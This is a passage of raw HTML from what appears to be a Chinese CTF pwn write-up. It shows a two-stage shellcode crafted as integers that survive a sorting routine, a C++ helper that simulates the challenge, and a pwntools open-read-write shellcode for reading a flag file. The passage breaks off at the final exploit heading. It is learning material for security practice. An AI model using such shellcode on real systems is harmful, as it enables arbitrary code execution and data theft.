class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,buf,&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; df        mov rbx,rdi &lt;span class=&#34;comment&#34;&gt;//把要写的地址传给rbx（因为rbx在其他地方用不到）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt; d2           xor edx,edx &lt;span class=&#34;comment&#34;&gt;//为什么不是rdx呢&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b6 &lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;           mov dh,&lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;//一方面设置第三个参数 0x100，也就是read的大小，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;01&lt;/span&gt; d3        add rbx,rdx &lt;span class=&#34;comment&#34;&gt;//另一方面可以让rbx+0x100，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt; C0           xor eax,eax  &lt;span class=&#34;comment&#34;&gt;//为什么不是rax,  read系统调用号是0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt; ff           xor edi,edi  &lt;span class=&#34;comment&#34;&gt;// 第一个参数0 ，标准输入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;89&lt;/span&gt; de        mov rsi,rbx &lt;span class=&#34;comment&#34;&gt;//第二个参数，buf地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0f&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;           syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ff e6           jmp rbx &lt;span class=&#34;comment&#34;&gt;//跳转到后续shellcode地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;所以问什么不&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;89&lt;/span&gt; fe        mov rsi,rdi &lt;span class=&#34;comment&#34;&gt;//把要写的地址传给rbx（因为rbx在其他地方用不到）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt; d2           xor edx,edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b6 &lt;span class=&#34;number&#34;&gt;01&lt;/span&gt; 	 		mov dh,&lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;//一方面设置rdx为0x100，也就是read的大小，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;01&lt;/span&gt; d6		add rsi,rdx &lt;span class=&#34;comment&#34;&gt;//另一方面可以让rbx+0x100，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt; C0           xor eax,eax  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt; ff           xor edi,edi  &lt;span class=&#34;comment&#34;&gt;// 第一个参数0 ，标准输入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0f&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;           syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ff e6           jmp rsi &lt;span class=&#34;comment&#34;&gt;//跳转到后续shellcode地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;注意字节序是反的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xfe8948&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xd231&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x01b6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xd60148&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xc031&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xff31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x050f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xe6ff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;排序有几个注意点&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;负数是自身绝对值越大， 数值越大吗。。(是的把，按位取反加&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;，看起来越大的值，补码越小，再加符号，越大，)（有空再看看。。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2.&lt;/span&gt;谁必须在谁前面  一个&lt;span class=&#34;number&#34;&gt;90&lt;/span&gt;，一个fc就可以保证了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3.&lt;/span&gt;syscall和jmp rsi必须在最后（fcfc就可以保证了，其他的最大fc90）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x90fe8948&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x9090d231&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x90fc01b6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xfcd60148&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xfc90c031&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xfc90ff31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xfcfc050f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xfcfce6ff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7fffffff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7fffffff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;-1869557199&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1862532682&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1862366904&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-57622479&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-57606351&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-53083832&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-50592497&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-50534657&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2147483647&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2147483647&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;同学的:&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/image-20231029143618124.png&#34; alt=&#34;image-20231029143618124&#34; style=&#34;zoom:50%;&#34;&gt;



&lt;p&gt;写一个脚本辅助生成(其实就是模拟题目)   &lt;font color=&#34;red&#34;&gt;这里是不是可以用cap那个工具 显示指令(埋个坑吧)、以及连起来更多的,一键生成exp&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c++&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; DIEnum[&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;10&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* v1=(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;mmap&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;34&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0ll&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;i&amp;lt;=&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%x&amp;quot;&lt;/span&gt;,&amp;amp;DIEnum[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;未排序前结果：\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;i&amp;lt;=&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,DIEnum[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    std::&lt;span class=&#34;built_in&#34;&gt;sort&lt;/span&gt;(DIEnum,DIEnum+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;排序后结果：\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;i&amp;lt;=&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;0x%-16x          %d\n&amp;quot;&lt;/span&gt;,DIEnum[i],DIEnum[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;输入的值：\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;i&amp;lt;=&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d &amp;quot;&lt;/span&gt;,DIEnum[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h3 id=&#34;二段shellcode&#34;&gt;&lt;a href=&#34;#二段shellcode&#34; class=&#34;headerlink&#34; title=&#34;二段shellcode&#34;&gt;&lt;/a&gt;二段shellcode&lt;/h3&gt;&lt;p&gt;这里应该就随意了,生成一个orw的就可以了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 设置目标架构为x86-64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch = &lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 默认的是大端序，可以修改&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.endian = &lt;span class=&#34;string&#34;&gt;&amp;#x27;little&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = shellcraft.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;./flag&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode += shellcraft.read(&lt;span class=&#34;string&#34;&gt;&amp;quot;rax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode += shellcraft.write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(asm(shellcode))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h3 id=&#34;最终exp&#34;&gt;&lt;a href=&#34;#最终exp&#34; class=&#34;headerlink&#34; title=&#34;最终exp&#34;&gt;&lt;/a&gt;最终exp&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span 